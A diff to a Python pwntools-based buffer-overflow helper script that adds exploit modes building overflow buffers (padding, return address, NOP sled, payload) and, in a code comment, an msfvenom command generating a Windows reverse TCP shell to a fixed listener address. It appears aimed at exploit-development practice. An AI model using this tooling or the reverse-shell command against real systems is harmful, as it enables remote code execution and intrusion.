@@ -1,24 +1,74 @@
 #!/usr/bin/python
 import random
 import argparse
-import sys,socket
-import string
-import time
+import os,sys,string,time
+import ast
 
 import pwn
 
 #############################################################################################
 #                                                                                           #
-#   exploit                                                                                 #
+#   cookieCutterExploit                                                                     #
 #   Cookie-cutter function to exploit the application                                       #
 #                                                                                           #
-#   before : if set, will be prepended to the exploit                                       #
 #   io (=None): pwn.tube object representing the connected remote                           #
 #               application. If None, stdout is to be used as io.                           #
 #                                                                                           #
 #############################################################################################
-def exploit(before = None, io = None):
+def cookieCutterExploit(io = None):
+    print('[+] Cookie Cutter Exploit mode', file=sys.stderr)
+
+    # Write your code here
+
+    buffer = []
+
+    prefix = b""
+    offset = 0
+    overflow = b"A" * offset
+    retn = b"BBBB"
+    padding = b"\x90" * 16
+    payload = b"" # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
+    postfix = b""
+
+    bufferEntry = prefix + overflow + retn + padding + payload + postfix
+    buffer.append(bytes(bufferEntry, encoding='utf-8'))
+    send(buffer, io)
+
+#############################################################################################
+#                                                                                           #
+#   exploit                                                                                 #
+#   Exploit the application with the given parameters from CLI                              #
+#                                                                                           #
+#   io (=None): pwn.tube object representing the connected remote                           #
+#               application. If None, stdout is to be used as io.                           #
+#                                                                                           #
+#############################################################################################
+def exploit(offset, ret, nop, payload, before = None, io = None):
     print('[+] Exploit mode', file=sys.stderr)
+
+    buffer = []
+    bufferEntry = (b"A" * int(offset)) + ret + (b"\x90" * int(nop)) + payload
+    buffer.append(bufferEntry)
+    send(buffer, io)
+
+#############################################################################################
+#                                                                                           #
+#   jsonExploit                                                                             #
+#   Exploit the application with the given parameters from JSON file                        #
+#                                                                                           #
+#   io (=None): pwn.tube object representing the connected remote                           #
+#               application. If None, stdout is to be used as io.                           #
+#                                                                                           #
+#############################################################################################
+def jsonExploit(path, io = None):
+    print('[+] Json Exploit mode', file=sys.stderr)
+
+    buffer = []
+    bufferEntry = ""
+
+    buffer.append(bytes(bufferEntry, encoding='utf-8'))
+    send(buffer, io)
+
 
 #############################################################################################
 #                                                                                           #
@@ -117,7 +167,10 @@ def send(buffer, io = None):
             if (io):
                 io.send(bytesLine)
             else:
-                print(bytesLine.decode('utf-8'))
+                fp = os.fdopen(sys.stdout.fileno(), 'wb')
+                fp.write(bytesLine)
+                fp.flush()
+
             print('[+] Done', file=sys.stderr)
         except Exception as e:
             print(e)
@@ -135,7 +188,7 @@ def getBadChars():
     # Generated with :
     # for x in range(1, 256):
     #     print("\\x" + "{:02x}".format(x), end='')
-    return "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\
+    return b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\
     \x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\
     \x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\
     \x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\
@@ -234,25 +287,31 @@ if __name__ == "__main__":
 
     # General options
     parser.add_argument("-V", "--version", help="show valhalla version", action="store_true")
-    parser.add_argument("-s", "--silent", help="hide beautiful viking banner (SHAME, you'll go to helheim !)", action="store_true")
+    parser.add_argument("-S", "--silent", help="hide beautiful viking banner (SHAME, you'll go to helheim !)", action="store_true")
     parser.add_argument("-b", "--before", help="When sending data (fuzz or exploit), this string is prepend first before each entry of the buffer")
 
     # Socket communication options
-    parser.add_argument("-H", "--host", help="set the host address where application is hosted")
-    parser.add_argument("-P", "--port", help="set the port where application is listening")
+    parser.add_argument("-H", "--host", help="Set the host address where application is hosted")
+    parser.add_argument("-P", "--port", help="Set the port where application is listening")
 
     # Fuzz options
-    parser.add_argument("-f", "--fuzz", help="fuzz the output")
+    parser.add_argument("-f", "--fuzz", help="Fuzz the output")
     parser.add_argument("-g", "--grow", help="When fuzzing, the lenght is increased by this number each time (100 by default)")
     parser.add_argument("-c", "--char", help="When fuzzing, the buffer is filled with this character ('A' by default)")
-    parser.add_argument("-r", "--random", help="When fuzzing, the buffer is filled random character instead", action="store_true")
+    parser.add_argument("-R", "--random", help="When fuzzing, the buffer is filled random character instead", action="store_true")
 
     # Pattern options
-    parser.add_argument("-p", "--pattern", help="send a cyclic de Bruijn sequence pattern of the given size (similar to metasploit pattern_create.rb)")
-    parser.add_argument("-o", "--offset", help="find the offset of the given hexadecimal value in the de Bruijn sequence pattern (similar to metasploit pattern_offset.rb)")
+    parser.add_argument("--pattern_create", help="Send a cyclic de Bruijn sequence pattern of the given size (similar to metasploit pattern_create.rb)")
+    parser.add_argument("--pattern_offset", help="Search the offset of the given hexadecimal value in the de Bruijn sequence pattern (similar to metasploit pattern_offset.rb)")
 
     # Exploit options
-    parser.add_argument("-e", "--exploit", help="exploit the application", action="store_true")
+    parser.add_argument("-e", "--exploit", help="Exploit the application", action="store_true")
+    parser.add_argument("-o", "--offset", help="Offset (obtained with pattern/search) to fill before overflow")
+    parser.add_argument("-r", "--ret", help="Return address, eg : override of EIP when overflow occurs. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
+    parser.add_argument("-n", "--nop", help="Nop sled size, just before the payload")
+    parser.add_argument("-p", "--payload", help="Payload bytes, to put after the Nop sled. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
+    parser.add_argument("-k", "--cookie", help="Call the cookie-cutter exploit function, written by user", action="store_true")
+    parser.add_argument("-j", "--json", help="Load the exploit parameters from the fiven json file")
     
     args = parser.parse_args()
 
@@ -276,12 +335,21 @@ if __name__ == "__main__":
             if not (char):
                 char = "A"
             fuzz(bufferEntriesNumber=args.fuzz, growingFactor=int(grow), character=char, randomCharacter=args.random, before=args.before, io=io)
-        elif (args.pattern):
-            patternCreate(args.pattern, io)
-        elif (args.offset):
-            patternOffset(args.offset, io)
+        elif (args.pattern_create):
+            patternCreate(size=args.pattern_create, io=io)
+        elif (args.pattern_offset):
+            patternOffset(offset=args.pattern_offset, io=io)
         elif (args.exploit):
-            exploit(io)
+            if (args.offset and args.ret and args.nop and args.payload):
+                retBytes = ast.literal_eval(args.ret)
+                payloadBytes = ast.literal_eval(args.payload)
+                exploit(offset=args.offset, ret=retBytes, nop=args.nop, payload=payloadBytes, before=args.before, io=io)
+            else:
+                print('[-] Exploit mode needs offset (-o), return address (-r), nop sled size (-n), and payload (-p)', file=sys.stderr)
+        elif (args.cookie):
+            cookieCutterExploit(io=io)
+        elif (args.json):
+            jsonExploit(path=args.json, io=io)
 
         if (io):
             io.close()
